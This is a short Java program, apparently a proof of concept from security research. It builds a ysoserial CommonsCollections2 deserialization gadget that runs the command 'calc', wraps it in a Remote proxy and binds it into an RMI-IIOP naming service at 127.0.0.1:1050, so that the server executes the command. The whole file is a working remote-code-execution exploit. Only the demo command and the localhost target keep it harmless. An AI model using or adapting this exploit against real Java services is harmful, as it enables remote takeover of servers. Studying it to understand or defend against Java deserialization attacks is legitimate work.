package rmi_iiop;

import ysoserial.payloads.CommonsCollections2;
import ysoserial.payloads.util.Gadgets;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.Remote;
import java.util.Hashtable;

public class EvilBindIIOPClient {
    public static void main(String[] args) throws Exception {
        Hashtable env = new Hashtable();
        env.put("java.naming.factory.initial", "com.sun.jndi.cosnaming.CNCtxFactory");
        env.put("java.naming.provider.url", "iiop://127.0.0.1:1050");

        Context context = new InitialContext(env);
        // get Object to Deserialize
        Object payload = CommonsCollections2.getObject("calc");
        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("random", payload), Remote.class);
        context.rebind("hello", remote);
    }
}
